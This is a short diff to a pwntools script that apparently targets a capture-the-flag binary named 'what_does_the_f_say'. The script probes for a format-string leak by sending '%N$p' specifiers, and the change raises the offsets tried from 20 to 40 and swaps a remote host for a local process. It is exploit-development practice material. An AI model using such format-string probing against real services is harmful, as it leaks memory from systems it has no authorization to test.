@@ -3,7 +3,7 @@ from pwn import *
 context.log_level = 'debug'
 
 def detect(io):
-	for i in range(20):
+	for i in range(40):
 		svar = '%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
 		io.sendline(b'1')
@@ -16,6 +16,7 @@ def detect(io):
 			io.sendline(b'n')
 
 ip, port = '142.93.34.45', 30123
-io = remote(ip, port)
+#io = remote(ip, port)
+io = process('./what_does_the_f_say')
 
 detect(io)
